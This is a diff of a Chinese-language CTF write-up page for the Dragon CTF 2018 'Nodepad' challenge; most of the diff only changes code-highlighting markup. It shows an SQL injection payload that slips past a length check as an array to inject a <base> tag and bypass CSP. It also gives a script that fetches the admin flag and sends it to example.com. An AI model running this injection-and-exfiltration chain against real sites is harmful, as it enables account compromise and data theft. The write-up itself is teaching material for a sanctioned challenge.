+      <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.pin input[name=&#34;value&#34;]&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;value&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>);
     }
 
-    element.find('.report').attr('href', '/notes/' + note.id + '/report');
-    element.find('.delete').attr('action', '/notes/' + note.id + '/delete');
+    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.report&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;href&#39;</span>, <span style="color:#e6db74">&#39;/notes/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/report&#39;</span>);
+    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.delete&#39;</span>).<span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;action&#39;</span>, <span style="color:#e6db74">&#39;/notes/&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">id</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/delete&#39;</span>);
 
-    var body = element.find('.body');
-    note.content.split('\n').forEach(function(text, line) {
-      var el = $('&lt;p&gt;&lt;/p&gt;');
-      el.text(text);
-      if (line === 0) el.addClass('lead');
-      body.append(el);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#39;.body&#39;</span>);
+    <span style="color:#a6e22e">note</span>.<span style="color:#a6e22e">content</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#39;\n&#39;</span>).<span style="color:#a6e22e">forEach</span>(<span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">text</span>, <span style="color:#a6e22e">line</span>) {
+      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">el</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">$</span>(<span style="color:#e6db74">&#39;&lt;p&gt;&lt;/p&gt;&#39;</span>);
+      <span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">text</span>(<span style="color:#a6e22e">text</span>);
+      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">line</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) <span style="color:#a6e22e">el</span>.<span style="color:#a6e22e">addClass</span>(<span style="color:#e6db74">&#39;lead&#39;</span>);
+      <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">el</span>);
     });
 
-    container.append(element);
+    <span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">append</span>(<span style="color:#a6e22e">element</span>);
   }
 
-  if (window.notes.length) {
-    window.notes.forEach(createNote);
-  } else {
-    container.append(&quot;&lt;p&gt;You don't have any notes&lt;/p&gt;&quot;);
-  }
-});
-</code></pre>
-
-<p>这么现在利用的方式非常明显了，我们需要控制 <code>title</code> 或者是 <code>content</code> 在页面中注入相应代码。回到源码上，我们可以看到这一段的逻辑在 <code>/routes/notes.js</code> 中：</p>
-
-<pre><code class="language-javascript">router.post('/new', async (req, res) =&gt; {
-  const regex = /[&lt;&gt;]/;
-
-  let errors = [];
-  if (regex.test(req.body.title)) {
-    errors.push('Title is invalid');
-  }
-
-  if (regex.test(req.body.content)) {
-    errors.push('Content is invalid');
-  }
-
-  if (errors.length !== 0) {
-    return res.render('new', {errors});
-  }
-
-  const result = await req.db.get `INSERT INTO notes (title, content, user_id) VALUES (${req.body.title}, ${req.body.content}, ${req.session.userId}) RETURNING id`;
-  if (result) {
-    return res.redirect(`/notes/${result.id}`);
-  } else {
-    res.render('new', {errors: [`Error occurred while saving your note`]});
+  <span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">length</span>) {
+    window.<span style="color:#a6e22e">notes</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">createNote</span>);
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">container</span>.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;&lt;p&gt;You don&#39;t have any notes&lt;/p&gt;&#34;</span>);
   }
 });
-</code></pre>
+</code></pre></div><p>这么现在利用的方式非常明显了，我们需要控制 <code>title</code> 或者是 <code>content</code> 在页面中注入相应代码。回到源码上，我们可以看到这一段的逻辑在 <code>/routes/notes.js</code> 中：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/new&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">regex</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/[&lt;&gt;]/</span>;
 
-<p>可以看到由于正则的存在使得我们无法直接传入相应 payload，因为我们要闭合标签必然要引入尖括号。但这是不是无法解决的呢？在万能的 js 中，一切都是可能的！</p>
+  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">errors</span> <span style="color:#f92672">=</span> [];
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">title</span>)) {
+    <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;Title is invalid&#39;</span>);
+  }
 
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">regex</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">content</span>)) {
+    <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;Content is invalid&#39;</span>);
+  }
+
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">!==</span> <span style="color:#ae81ff">0</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;new&#39;</span>, {<span style="color:#a6e22e">errors</span>});
+  }
+
+  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">get</span> <span style="color:#e6db74">`INSERT INTO notes (title, content, user_id) VALUES (</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">title</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">content</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">userId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">) RETURNING id`</span>;
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>) {
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">`/notes/</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">id</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+  } <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;new&#39;</span>, {<span style="color:#a6e22e">errors</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">`Error occurred while saving your note`</span>]});
+  }
+});
+</code></pre></div><p>可以看到由于正则的存在使得我们无法直接传入相应 payload，因为我们要闭合标签必然要引入尖括号。但这是不是无法解决的呢？在万能的 js 中，一切都是可能的！</p>
 <p>我们注意到 <code>routes/notes.js</code> 中定义的路由在执行 sql 语句时，存在着一个注入点，所以可以尝试在 <code>req.body.value</code> 处进行 sql 注入：</p>
-
-<pre><code class="language-javascript">router.post('/:noteId(\\d+)/pin', async (req, res) =&gt; {
-  if (req.body.value.length === 1) {
-    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
-    if (result.error) {
-      return res.render('index', {errors: ['An error occurred']});
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/:noteId(\\d+)/pin&#39;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">value</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>) {
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">db</span>.<span style="color:#a6e22e">run</span>(<span style="color:#e6db74">`UPDATE notes SET pinned = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">value</span><span style="color:#e6db74">}</span><span style="color:#e6db74">::boolean WHERE id = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">params</span>.<span style="color:#a6e22e">noteId</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">error</span>) {
+      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, {<span style="color:#a6e22e">errors</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;An error occurred&#39;</span>]});
     }
   }
 
-  res.redirect('/notes');
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/notes&#39;</span>);
 });
-</code></pre>
-
-<p>但上述利用点对 <code>value</code> 的长度有一定限制，不能超过 1，但在这里，我们可以通过将 <code>value</code> 赋值成数组的方式绕过，因为数组恰好满足了长度为 1 的要求，而且在字符串模板拼接会被自动解包：</p>
-
-<pre><code class="language-javascript">const value = [&quot;1::boolean, title='&lt;/script&gt;&lt;base href=http://example.com/&gt;' WHERE id = 8888--&quot;]
-console.log(`UPDATE notes SET pinned = ${value}::boolean WHERE id = 8888`);
-// output
-// UPDATE notes SET pinned = 1::boolean, title='&lt;/script&gt;&lt;base href=http://example.com/&gt;' WHERE id = 8888--::boolean WHERE id = 8888
-</code></pre>
-
-<p>既然这里已经确认存在一个 xss 的利用点了，然后下一步就是绕过 CSP 的限制。</p>
-
-<pre><code class="language-javascript">app.use((req, res, next) =&gt; {
-  res.set('X-XSS-Protection', '0');
-  res.set('Content-Security-Policy', `
-    default-src 'none';
-    script-src 'nonce-${res.locals.nonce}' 'strict-dynamic';
-    style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
-    img-src 'self';
-    connect-src 'self';
-    frame-src https://www.google.com/recaptcha/;
-    form-action 'self';
-  `.replace(/\n/g, ''));
-  next();
+</code></pre></div><p>但上述利用点对 <code>value</code> 的长度有一定限制，不能超过 1，但在这里，我们可以通过将 <code>value</code> 赋值成数组的方式绕过，因为数组恰好满足了长度为 1 的要求，而且在字符串模板拼接会被自动解包：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">value</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;1::boolean, title=&#39;&lt;/script&gt;&lt;base href=http://example.com/&gt;&#39; WHERE id = 8888--&#34;</span>]
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`UPDATE notes SET pinned = </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">value</span><span style="color:#e6db74">}</span><span style="color:#e6db74">::boolean WHERE id = 8888`</span>);
+<span style="color:#75715e">// output
+</span><span style="color:#75715e">// UPDATE notes SET pinned = 1::boolean, title=&#39;&lt;/script&gt;&lt;base href=http://example.com/&gt;&#39; WHERE id = 8888--::boolean WHERE id = 8888
+</span></code></pre></div><p>既然这里已经确认存在一个 xss 的利用点了，然后下一步就是绕过 CSP 的限制。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>((<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;X-XSS-Protection&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
+  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>, <span style="color:#e6db74">`
+</span><span style="color:#e6db74">    default-src &#39;none&#39;;
+</span><span style="color:#e6db74">    script-src &#39;nonce-</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">locals</span>.<span style="color:#a6e22e">nonce</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; &#39;strict-dynamic&#39;;
+</span><span style="color:#e6db74">    style-src &#39;self&#39; https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
+</span><span style="color:#e6db74">    img-src &#39;self&#39;;
+</span><span style="color:#e6db74">    connect-src &#39;self&#39;;
+</span><span style="color:#e6db74">    frame-src https://www.google.com/recaptcha/;
+</span><span style="color:#e6db74">    form-action &#39;self&#39;;
+</span><span style="color:#e6db74">  `</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/\n/g</span>, <span style="color:#e6db74">&#39;&#39;</span>));
+  <span style="color:#a6e22e">next</span>();
 });
-</code></pre>
-
-<p>可以看到 CSP 对我们的脚本做了比较严格的限制，但我们仍然有办法：使用 <code>&lt;base&gt;</code> 标签。根据 <code>&lt;base&gt;</code> 的定义，它可以为页面上的所有链接规定一个默认地址或默认目标，然后浏览器随后将使用指定的基本 URL 来解析所有的相对 URL，包括 <code>&lt;a&gt;</code> \ <code>&lt;img&gt;</code> 等标签。这样我们就可以将 <code>javascripts/notes.js</code> 指向部署在我们自己网站上的 payload，例如：</p>
-
-<pre><code class="language-javascript">// javascripts/notes.js in our websites
-fetch('http://nodepad.hackable.software:3000/admin/flag').then((res) =&gt; {
-    res.text().then((text) =&gt; {
-        location.href = 'http://example.com/?flag=' + btoa(text);
+</code></pre></div><p>可以看到 CSP 对我们的脚本做了比较严格的限制，但我们仍然有办法：使用 <code>&lt;base&gt;</code> 标签。根据 <code>&lt;base&gt;</code> 的定义，它可以为页面上的所有链接规定一个默认地址或默认目标，然后浏览器随后将使用指定的基本 URL 来解析所有的相对 URL，包括 <code>&lt;a&gt;</code> \ <code>&lt;img&gt;</code> 等标签。这样我们就可以将 <code>javascripts/notes.js</code> 指向部署在我们自己网站上的 payload，例如：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#75715e">// javascripts/notes.js in our websites
+</span><span style="color:#75715e"></span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;http://nodepad.hackable.software:3000/admin/flag&#39;</span>).<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">res</span>) =&gt; {
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>().<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">text</span>) =&gt; {
+        <span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://example.com/?flag=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">btoa</span>(<span style="color:#a6e22e">text</span>);
     });
 })
-</code></pre>
-
-<p>一波操作：</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/DragonCTF-Web-Writeup/postman.png" alt="Postman" class="lazyload"><figcaption class="image-caption">Postman</figcaption></figure></p>
-
+</code></pre></div><p>一波操作：</p>
+<p><img src="/images/posts/DragonCTF-Web-Writeup/postman.png" alt="Postman"></p>
 <p>成功获得 flag：<code>DrgnS{Ar3_Y0u_T3mP14t3d?}</code></p>
-
 <p>PS: r3kapig 的大佬貌似使用了对象的方式绕过，具体原因大概是数据库操作时会进行的解包操作？感兴趣的朋友可以尝试一下（再告诉我，逃</p>
-
 <h2 id="总结">总结</h2>
-
 <p>Dargon Sector 不愧是国际强队，出的题目也相当的有质量，使人在做题之余也收获颇丰。</p>
-
 <h2 id="参考资料">参考资料</h2>
-
 <ul>
-<li><a href="https://ctftime.org/writeup/11452" rel="nofollow noreferrer" target="_blank">Nodepad by secse</a></li>
-<li><a href="https://xz.aliyun.com/t/2831" rel="nofollow noreferrer" target="_blank">Teaser Dragon CTF 2018 Writeup by r3kapig</a></li>
-<li><a href="https://www.w3schools.com/tags/tag_base.asp" rel="nofollow noreferrer" target="_blank">HTML <base> Tag</a></li>
-<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals" rel="nofollow noreferrer" target="_blank">模板字符串</a></li>
+<li><a href="https://ctftime.org/writeup/11452">Nodepad by secse</a></li>
+<li><a href="https://xz.aliyun.com/t/2831">Teaser Dragon CTF 2018 Writeup by r3kapig</a></li>
+<li><a href="https://www.w3schools.com/tags/tag_base.asp">HTML <!-- raw HTML omitted --> Tag</a></li>
+<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings#Tagged_template_literals">模板字符串</a></li>
 </ul>
 
     </div>
